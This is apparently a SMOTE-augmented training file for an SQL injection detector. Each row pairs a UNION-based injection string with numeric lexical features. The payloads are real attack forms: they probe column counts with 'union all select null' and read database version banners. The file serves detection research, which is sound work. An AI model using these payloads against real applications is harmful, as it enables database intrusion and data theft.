id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,0.3963290512356539,100.33161018049648,26.110536726832162,4.0573092703435645,62.0,5.0,24.0,9.331610180496483,0.6180038998843901,0.04983902418422502,0.23922731608428002,0.09292975984710486,0.33161018049648355,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,7.0,0.1105367268321614,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000012,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000254,0.24880131655449705,63.249873890365166,22.08329129678839,3.8591302318527143,32.666834812846446,9.0,16.49974778073033,5.0832912967883885,0.5167784403144001,0.14231629028059486,0.2605786743482848,0.08032659505672021,0.08329129678838842,0.0,2.0,0.0,0.0,1.0,0.0,1.0832912967883885,0.0,0.0,0.9167087032116115,3.0,0.08329129678838848,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000013,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000282,0.2569154739036044,70.37280996393257,15.0,3.1013874430991657,40.69824797114605,1.0,18.0,10.674561992786513,0.5776469165406246,0.014253402785857405,0.25656125014543324,0.15153843052808486,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.674561992786513,2.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,union," select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",nearest_attack_euclidean,R000089,0.15057974113780498,81.15186420993136,32.07593210496568,4.168668128006702,44.0,2.0,24.07593210496568,11.07593210496568,0.5422159712573286,0.024646180511696758,0.2966690107785018,0.13646883745247287,0.0,0.0,2.0,0.0,1.9240678950343193,1.0,0.0,2.0,0.0,0.0,1.0,5.0759321049656805,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000015,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000132,0.07594467939276554,97.25231311991547,26.0,4.042801623375768,62.0,4.126156559957734,23.126156559957735,8.0,0.6375462445657858,0.04240632446487955,0.23778339941245907,0.08226403155687559,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,5.126156559957734,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000016,attack,union," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000050,0.010404062439901786,87.0,27.0,3.826458812362418,42.0,4.014700581766339,29.0,11.985299418233662,0.4827586206896552,0.04614598369846366,0.3333333333333333,0.13776206227854784,0.0,1.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,1.9852994182336614,5.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000017,attack,union," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000140,0.2158099585580699,72.34419380482605,31.344193804826048,4.36445052255926,44.0,2.0,16.344193804826048,10.0,0.6082297322274837,0.02764680601034017,0.22588943171047537,0.13823403005170082,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.655806195173952,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000018,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,1.5077951170717485,83.54215471764908,28.45784528235092,3.988595737437159,42.45784528235092,3.0,25.0,13.084309435298161,0.5082743123316431,0.03591129315075341,0.2992607762562784,0.15655361826132505,2.54215471764908,1.5421547176490802,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.54215471764908,1.0,1.0,1.0,0.4578452823509198,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000019,attack,union,"1' where 7104  =  7104 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000232,1.2161260701691652,79.4451190513426,22.88902381026852,3.6953610939287116,48.778047620537045,9.0,11.778047620537041,9.88902381026852,0.6148130158630865,0.11372453780986927,0.14727880486695719,0.12418364146008716,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4445119051342603,0.0,0.0,6.444511905134261,1.0,1.0,2.7755575615628914e-17,0.0,1.0,0.0,1.0,0.4445119051342604,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,union,"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#",nearest_attack_euclidean,R000256,1.1034971244578782,79.14615244065581,20.691025406775967,3.4275241211596645,14.0,36.0,16.764101627103873,12.382050813551936,0.17711174746186314,0.4554302077590767,0.21123645890758996,0.15622158587147017,0.0,0.691025406775968,1.0,0.0,0.0,0.0,0.0,2.6910254067759682,0.0,0.0,7.0,1.0,0.0,0.6910254067759679,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000021,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000045,0.18474114391480054,78.0,31.0,4.176250070572668,42.0,4.0,22.0,10.0,0.5384615384615384,0.05128205128205128,0.28205128205128205,0.1282051282051282,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,5.33930229966135,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000022,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000150,1.1471397250089164,82.21750931323237,28.217509313232362,3.951775081425172,42.608754656616185,3.3912453433838188,25.0,11.217509313232362,0.5182468743165479,0.04132393805758737,0.30411457194246483,0.13631461568339992,1.2175093132323624,1.0,2.0,0.0,1.0,1.0,1.0,2.0,0.0,0.0,1.0,4.0,0.608754656616181,1.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000023,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,1.1881363906372835,98.91270358225108,25.395635179112556,3.7779455303005576,55.33016286580087,9.0,22.0,12.582540716450218,0.5571054692859693,0.09185087295908723,0.22452435612221325,0.1265193016327302,0.0,1.0,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,6.582540716450218,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,union,1'   )    )    as vwua where 8099  =  8099 union all select null--,nearest_attack_euclidean,R000308,0.939982101297189,69.89130541996661,23.648550903327767,3.7875028272653806,28.13526546222964,13.1074890544092,22.0,6.648550903327768,0.4087445280173385,0.17894526132960095,0.31789164515886265,0.09441856549419789,0.7838163655574105,0.0,2.2161836344425896,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.6485509033277685,3.2161836344425896,0.7838163655574105,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000025,attack,union,"1%""   )    )     )   union all select null#",nearest_attack_euclidean,R000264,0.3779522331356298,44.030023318862085,16.06866822125747,3.110268249246044,19.09869154011956,1.0,17.72532711497011,6.2060046637724176,0.4301135992324072,0.022842813424674382,0.40643490224707185,0.1406086850958466,0.06866822125747263,0.9313317787425275,0.0,0.0,0.0,0.0,0.0,2.9313317787425275,1.0,0.0,0.27467288502989007,4.440892098500626e-16,0.06866822125747252,0.9313317787425275,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,union," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",nearest_attack_euclidean,R000018,6.004682392025084,84.0,27.0,3.9211228013533774,46.0,3.0,25.0,10.0,0.5476190476190477,0.03571428571428571,0.2976190476190476,0.11904761904761904,0.0,1.0,2.0,0.0,1.0,1.0,0.5223323792765449,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.5223323792765449,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000027,attack,union,"1' union all select null,null,null--",nearest_attack_euclidean,R000240,1.7372385044182024,35.63811516330122,16.809424183493885,3.6245848571809494,21.65738195961468,3.5331938568914385,5.447539346795107,5.000000000000001,0.6056148859526164,0.1004419553053893,0.15361821891382457,0.14032493982816974,1.0,0.0,2.361884836698777,0.0,0.0,0.0,0.0,0.3618848366987768,0.0,0.0,1.2762303266024466,2.361884836698777,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.3618848366987768,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000028,attack,union,"-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--",nearest_attack_euclidean,R000237,1.4487046204934004,67.73865525153983,23.053034500342186,3.9538687951642295,28.787861998631264,16.897758752566382,16.0,6.053034500342185,0.43083326336264444,0.24314614288973185,0.23725342062948912,0.08876717311813459,0.0,0.0,2.526517250171092,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.5265172501710924,3.526517250171092,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000029,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000064,0.32296525542041027,76.0,25.513374612041574,3.8236190314879686,41.0,3.4866253879584255,24.0,7.513374612041575,0.5394736842105263,0.04587664984155822,0.3157894736842105,0.09886019226370493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000030,attack,union,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",nearest_attack_euclidean,R000281,0.34440643636193596,66.21501231183755,20.756997537632486,3.7411495053527526,14.0,28.0,14.972009849470046,9.243002462367512,0.21164611596357674,0.4232922319271535,0.225531970956006,0.13952968115326378,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.2430024623675116,0.0,0.0,5.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000031,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.08336483579836024,97.0,26.858645910379458,3.766540482806593,49.0,3.141354089620539,33.0,11.85864591037946,0.5051546391752577,0.032385093707428245,0.3402061855670103,0.1222540815503037,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
